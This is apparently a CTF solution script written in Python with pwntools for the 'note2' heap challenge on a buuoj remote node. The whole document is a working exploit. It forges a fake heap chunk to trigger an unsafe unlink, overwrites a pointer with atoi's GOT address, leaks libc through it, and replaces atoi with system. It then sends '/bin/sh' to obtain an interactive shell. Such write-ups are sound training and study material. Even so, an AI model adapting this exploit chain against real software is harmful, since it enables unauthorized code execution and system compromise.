#+++++++++++++++++++note2.py++++++++++++++++++++
# -*- coding:utf-8 -*-                           
#Author: Squarer
#Time: Sat Oct 17 21:27:05 CST 2020
#+++++++++++++++++++note2.py++++++++++++++++++++
from pwn import*
from LibcSearcher import*

context.log_level = 'debug'
context.arch = 'amd64'

def newnote(length,cont):
	sh.sendlineafter('option--->>\n','1')
	sh.sendlineafter('(less than 128)\n',str(length))
	sh.sendlineafter('Input the note content:\n',str(cont))
	
def show(id):
	sh.sendlineafter('option--->>\n','2')
	sh.sendlineafter('Input the id of the note:\n',str(id))

def edit(id,choice,cont):
	sh.sendlineafter('option--->>\n','3')
	sh.sendlineafter('Input the id of the note:\n',str(id))
	sh.sendlineafter('[1.overwrite/2.append]\n',str(choice))
	sh.sendlineafter('TheNewContents:',str(cont))

def delete(id):
	sh.sendlineafter('option--->>\n','4')
	sh.sendlineafter('Input the id of the note:\n',str(id))


elf = ELF('./note2')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc=ELF('/lib/i386-linux-gnu/libc.so.6')

sh = process('./note2')
sh = remote('node3.buuoj.cn',26206)
sh.sendlineafter('Input your name:\n','test')
sh.sendlineafter('Input your address:\n','test')
# chunk0: a fake chunk
ptr = 0x0000000000602120  #bss_ptr_chunk
fakefd = ptr - 0x18
fakebk = ptr - 0x10
content = 'a' * 8 + p64(0x61) + p64(fakefd) + p64(fakebk) + 'b' * 0x40 + p64(0x60)
#content = p64(fakefd) + p64(fakebk)
newnote(128, content)
# chunk1: a zero size chunk produce overwrite
newnote(0, 'a' * 8)
# chunk2: a chunk to be overwrited and freed
newnote(0x80, 'b' * 16)

# edit the chunk1 to overwrite the chunk2
delete(1)
content = 'a' * 16 + p64(0xa0) + p64(0x90)
newnote(0, content)
# delete note 2 to trigger the unlink
# after unlink, ptr[0] = ptr - 0x18
delete(2)

# overwrite the chunk0(which is ptr[0]) with got atoi
atoi_got = elf.got['atoi']
content = 'a' * 0x18 + p64(atoi_got)
edit(0,1,content)

show(0)

sh.recvuntil('is ')
atoi_addr = sh.recvuntil('\n', drop=True)
print atoi_addr
atoi_addr = u64(atoi_addr.ljust(8, '\x00'))
print 'leak atoi addr: ' + hex(atoi_addr)

lib_L = LibcSearcher('atoi',atoi_addr)
lib_L_addr = atoi_addr - lib_L.dump('atoi')
system_L_addr = lib_L_addr + lib_L.dump('system')
# get system addr
atoi_offest = libc.symbols['atoi']
libcbase = atoi_addr - atoi_offest
system_offest = libc.symbols['system']
system_addr = libcbase + system_offest

print 'leak system addr: ', hex(system_addr)

# overwrite the atoi got with systemaddr
content = p64(system_L_addr)
edit(0, 1, content)

# get shell
sh.recvuntil('option--->>')
sh.sendline('/bin/sh')
sh.interactive()

